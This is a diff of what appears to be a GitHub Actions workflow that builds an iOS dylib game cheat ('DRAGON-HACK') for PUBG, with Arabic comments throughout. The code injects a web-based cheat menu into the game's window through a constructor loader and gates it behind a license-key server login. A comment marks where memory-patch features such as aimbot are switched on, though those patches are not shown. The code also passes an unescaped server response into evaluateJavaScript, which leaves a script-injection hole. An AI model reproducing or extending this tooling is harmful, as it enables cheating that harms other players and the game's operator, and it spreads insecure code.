+                      if(e.touches.length === 3 && !e.target.closest('.interactive')) { toggleMenu(); }
+                  });
               </script>
           </body>
           </html>
           )HTML";
 
+          // ==========================================================
+          // 7. [جسر الـ WebView والـ HitTest السحري] ⚙️
+          // [شرح]: هذا الجزء يربط الويب باللعبة ويسمح للمس بالمرور
+          // ==========================================================
           @interface WMasterMenu : UIViewController <WKScriptMessageHandler>
           @property (nonatomic, strong) WKWebView *webView;
           @end
+
           @implementation WMasterMenu
           - (void)viewDidLoad {
               [super viewDidLoad];
               self.view.backgroundColor = [UIColor clearColor];
+              
               WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
               [config.userContentController addScriptMessageHandler:self name:@"wmaster"];
+              
               self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
               self.webView.backgroundColor = [UIColor clearColor];
               self.webView.opaque = NO;
               self.webView.scrollView.bounces = NO;
+              self.webView.scrollView.backgroundColor = [UIColor clearColor];
               [self.view addSubview:self.webView];
+              
               [self.webView loadHTMLString:[NSString stringWithUTF8String:HTML_UI] baseURL:nil];
           }
+
           - (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
               NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:[message.body dataUsingEncoding:NSUTF8StringEncoding] options:0 error:nil];
-              if ([dict[@"action"] isEqualToString:@"login"]) {
+              NSString *action = dict[@"action"];
+              
+              if ([action isEqualToString:@"login"]) {
+                  NSString *key = dict[@"key"];
                   dispatch_async(dispatch_get_global_queue(0, 0), ^{
-                      string res = SyncWithServer(string([dict[@"key"] UTF8String]));
+                      string res = SyncWithServer(string([key UTF8String]));
                       dispatch_async(dispatch_get_main_queue(), ^{
-                          [self.webView evaluateJavaScript:[NSString stringWithFormat:@"onLoginResponse('%@')", [NSString stringWithUTF8String:res.c_str()]] completionHandler:nil];
+                          NSString *jsCode = [NSString stringWithFormat:@"onLoginResponse('%@')", [NSString stringWithUTF8String:res.c_str()]];
+                          [self.webView evaluateJavaScript:jsCode completionHandler:nil];
                       });
                   });
+              } else if ([action isEqualToString:@"toggle"]) {
+                  // [شرح]: هنا تفعل ميزات الـ Memory Patch (الايمبوت، الثبات، الخ..)
               }
           }
 
-          // 🛡️ حل تجمد اللمس (HitTest العبقري)
+          // [شرح]: منع تجمد اللعبة! يسمح للمس بالمرور للعبة بوبجي إذا لم تلمس المنيو
           - (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
               if (g_IsServerFrozen || !g_IsLoggedIn) return [super.view hitTest:point withEvent:event];
               UIView *hitView = [super.view hitTest:point withEvent:event];
@@ -300,16 +419,22 @@ jobs:
           }
           @end
 
+          // ==========================================================
+          // 8. [نظام الإقلاع العنيد] 🚀
+          // ==========================================================
           @interface WMasterLoader : NSObject
           + (void)inject;
           @end
+
           @implementation WMasterLoader
           + (void)inject {
               dispatch_async(dispatch_get_main_queue(), ^{
                   UIWindow *mainWindow = nil;
                   for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
                       if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
-                          for (UIWindow *window in ((UIWindowScene *)scene).windows) { if (window.isKeyWindow) { mainWindow = window; break; } }
+                          for (UIWindow *window in ((UIWindowScene *)scene).windows) {
+                              if (window.isKeyWindow) { mainWindow = window; break; }
+                          }
                       }
                   }
                   if (mainWindow && mainWindow.rootViewController) {
@@ -317,35 +442,38 @@ jobs:
                       [mainWindow addSubview:menuVC.view];
                       menuVC.view.frame = mainWindow.bounds;
                       [mainWindow bringSubviewToFront:menuVC.view];
+                      NSLog(@"[W-MASTER] 🦅 تم زرع واجهة الشيتو بنجاح.");
                   } else {
                       dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{ [self inject]; });
                   }
               });
           }
           @end
+
           __attribute__((constructor))
-          void Start() { [WMasterLoader inject]; }
+          void Start() { 
+              [WMasterLoader inject]; 
+          }
           EOF
 
-      - name: 🛠️ تجهيز Xcode SDK
+      - name: 🛠️ تجهيز بيئة البناء
         run: sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
 
-      - name: 🔥 عملية الصهر (Cheeto Engine)
+      - name: 🔥 عملية البناء والصهر
         run: |
-          curl -sSL -o json.hpp https://raw.githubusercontent.com/nlohmann/json/develop/single_include/nlohmann/json.hpp
           mkdir -p out
           xcrun --sdk iphoneos clang++ -x objective-c++ -arch arm64 -dynamiclib -std=c++17 -O3 -fobjc-arc \
           -I. wsam.mm \
           -framework Foundation -framework UIKit -framework WebKit \
-          -o out/WMASTER_Dragon_Cheeto.dylib
+          -o out/WMASTER_Dragon.dylib
 
       - name: 📦 ضغط الملف للتحميل
         run: |
           cd out
-          zip DRAGON-HACK.zip WMASTER_Dragon_Cheeto.dylib
+          zip DRAGON-HACK.zip WMASTER_Dragon.dylib
 
-      - name: 📤 استخراج الهاك النهائي
+      - name: 📤 استخراج الملف النهائي
         uses: actions/upload-artifact@v4
         with:
-          name: DRAGON-HACK-CHEETO
+          name: DRAGON-HACK-CHEETO-VIP
           path: out/DRAGON-HACK.zip
